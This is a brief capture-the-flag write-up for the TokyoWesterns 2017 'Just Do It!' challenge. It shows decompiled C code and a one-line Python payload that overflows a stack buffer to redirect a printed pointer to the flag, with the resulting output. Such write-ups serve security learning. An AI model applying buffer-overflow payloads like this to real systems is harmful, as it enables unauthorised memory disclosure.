# TokyoWesterns 2017 - Just Do It!

The flag seems to be stored somewhere in memory. Thankfully, using ```checksec```, we can see that ```PIE``` is disabled.

```c
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
```

We can overflow in ```local_14``` and change the value to point to the flag.

```bash
[root@pwn:~/tw17_justdoit]$ python -c 'print "A" * 20 + "\x80\xa0\x04\x08"' | ./just
_do_it 
Welcome my secret service. Do you know the password?
Input the password.
TWCTF{pwnable_warmup_I_did_it!}
```